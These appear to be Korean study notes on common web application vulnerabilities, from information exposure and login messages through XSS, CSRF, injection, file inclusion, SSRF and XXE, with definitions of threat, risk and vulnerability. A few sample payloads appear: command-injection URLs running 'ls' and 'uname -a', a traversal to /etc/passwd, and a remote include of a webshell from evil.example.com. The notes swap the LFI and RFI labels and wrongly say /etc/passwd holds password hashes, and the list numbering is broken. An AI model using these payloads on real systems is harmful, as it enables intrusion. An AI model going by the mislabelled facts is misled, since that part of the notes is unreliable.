1. 단순 정보 노출

2. 1. 불필요 파일/페이지 노출

 

불필요한 파일/페이지 노출은 말 그대로 웹 사이트의 민감 정보가 의도치 않게 노출되는 취약점을 의미한다. 

불필요 파일 : 애플리케이션 설치시 기본적으로 제공되는 매뉴얼, 기본 설치 페이지, 소스 백업 파일등을 의미하며 이를 통해 시스템 관련 정보 혹은 내부 프로그램 로직등이 노출될 수 있는 간접적인 위험을 제공할 수 있다.

 백업파일, 로그파일, 압축파일과 같은 파일이 노출되는 경우

 

 

1. 부적절한 로그인 실패 메시지

 

부적절한 로그인 실패 메시지는 공격자에게 계정관련 정보를 줄 수 있음.

입력한 아이디가 존재하는지, 비밀번호가 맞는지 모두를 알 수 없도록 '해당되는 아이디가 없습니다', '비밀번호가 틀렸습니다' 가 아닌 'ID 혹은 PW가 잘못되었습니다' 라는 실패 메시지를 출력하도록 한다.

 

1. 주석처리 중요정보 노출
2. 에러 메시지 노출

 

해커가 의도적인 에러를 유발하였을 떄 적절한 예외처리를 하지않아 에러 정보에 중요정보가 포함되어 공격에 도움이 되는 정보가 노출 될 수 있는 보안 취약점

 

1. Default Page 노출

 

애플리케이션 설치시 기본적으로 설치되는 샘플 페이지, 디폴트 페이지, 관리자 페이지 등을 제어하지 않아 웹 서버에 대한 정보를 제공하게 되는 보안 취약점

 

 

1. 서버 버전 정보 노출

 

사용자 입력값에 대한 적절한 예외처리의 부재로 에러 페이지에 서버 버전 정보가 노출되는 취약점.

 

1. 중요 정보 노출

2. 1. 중요정보 평문 전송

 

사용자 또는 시스템의 중요정보가 포함된 데이터를 평문으로 송수신 할 경우, 통신채널 스니핑을 통해 인가되지 않은 사용자에게 해당 데이터가 노출될 수 있는 보안 취약점

Wireshark로 보이는 패킷에 암호화되어 알아볼 수 없도록 되어있지 않고 일반적인 문자가 적혀있다면 취약한 것.

 

1. 중요정보 평문 노출

비밀번호, 개인정보 등의 중요정보를 암호화하여 저장하지 않아 정보가 노출될 수 있는 보안약점

 

1. 파일 다운로드

 

홈페이지 상에서 파일을 다운받는 asp, jsp, php등의 프로그램에서 입력되는 경로를 검증하지 않는 경우 임의의 위치에 있는 파일을 열람하거나 다운받을 수 있는 보안 약점.

1. 디렉터리 리스팅

 

웹 서버 운영시 특정 디렉터리에 초기화 파일이 없을 경우 (index.html, default.html ..etc)해당 디렉터리의 파일 리스트를 브라우저에게 보여주게 되는 취약점.

-> 구조 파악 & 민감정보가 포함된 설정 파일 노출 -> 보안 위험

 

1. 소스코드 노출

 

소스코드 노출은 사용자 입력값에 대한 검증이 없어 발생함

 

1. 취약한 인증 및 권한

2. 1. 추측 가능한 계정/비밀번호
   2. Brute-Force       허용
   3. 불충분한 인증/인가
   4. Cross-Site Script

해커가 웹 사이트에 스크립트를 삽입해 의도치 않은 행동을 수행시키거나 민감정보 탈취가 가능한 보안 약점.

 

1. CSRF

클라이언트가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삽입, 삭제, 등록..)를 특정 웹사이트에 요청하게 만드는 공격

(계정 삭제, 비밀번호 변경시키기, 등등..)

 

1. 프로세스 검증 누락

애플리케이션의 계획된 플로우 통제를 우회하는 것을 허가하는 보안약점.

 

 

1. 원격 명령실행

2. 1. Command Injection

../../../var/apache/error_log&cmd=ls

../../../var/apache/e..&cmd=uname -a

 

OS명령어를 삽입하고 요청을 보내 웹 서버에서 실행시키는 취약점

 

1. SQL Injection

 

1. LFI/RFI

 

파일이 존재하는 위치가 로컬이나 원격이냐에 따라 LFI / RFI 로 나뉨.

공격 대상 서버에 위치한 파일을 포함시켜 읽어오도록 하는 공격

RFI Ex) example.com/index.jsp?file=../../../../../../etc/passwd

/etc/passwd : 서버 내 모든 계정에 대한 해시값을 갖는 파일

 

LFI EX) example.com/index.jsp?file=http://evil.example.com/webshell.txt

 

 

1. 파일 업로드

서버 사이드 언어로 개발된 프로그램을 업로드하여 실행시킬 수 있는 취약점이다.

 

 

1. SSRF

서버 사이드에서 이루어지는 request를 변조하여 해커가 의도한 서버로 요청이 가게 되거나 요청 내용을 변경할 수 있는 공격을 의미한다.

-> 사용자의 입력을 받아 서버가 직접 다른 웹 또는 포트에 직접 접근해서 데이터를 가져오는 기능들에서 주로 발생.

 

1. XXE Injection

XXE : XML External Entity , XML : Extensible Markup Language로 다른 특수한 목적을 갖는 Markup Language를 만드는데 사용하는 언어

즉, XML 외부 요소를 삽입하는 공격

XML 문서에서 동적으로 외부 URI 리소스를 포함시킬 수 있는 external entity를 사용하여 서버의 로컬파일 열람을 유발할 수 있는 취약점으로 XML Request를 파싱하는 페이지에서 발생한다.

 

1. 검증되지 않은 Redirect/Forward

 

사용자의 입력값에 대한 검증 없이 리다이렉트 처리시 발생하는 취약점. 

-> 악의적인 URL로 렌더링 될 수 있다는 점.

 

 

인증/인가

 

인증 : 자원에 접근시, 등록된 사용자 인지 여부를 확인하는 것.

Ex ) 로그인

 

인가 : 접근 이후, 인증된 사용자에게 권한을 부여하는 것

권한에 따라 사용 가능한 기능이 제한된다.

 

인증을 거친 이후, 인증된 사용자에게 특정한 권한을 부여하는것이 인가다.

 

위협 : 자산에 손실을 발생시키는 원인 또는 행위

위험 : 예상되는 위협에 의해 자산에 발생할 가능성이 있는 손실의 기대치

취약점 : 위협에 의해 손실이 발생하게 되는 자산의 약점.

 

Vulnerability(취약점)이 존재하지 않는다면 Threat(위협)은 Risk(위험)이 될 수 없다.

위협 - 도둑놈, 위험이 발생할 수 있는 잠재적 요인

취약점 - 빈틈, 보호하고자 하는 대상이 가진 흠

위험 - 도둑놈이 빈틈을 노려 보석을 훔침, 위협이 취약점을 이용해 보호대상을 훼손하거나 훔쳐갈 가능성
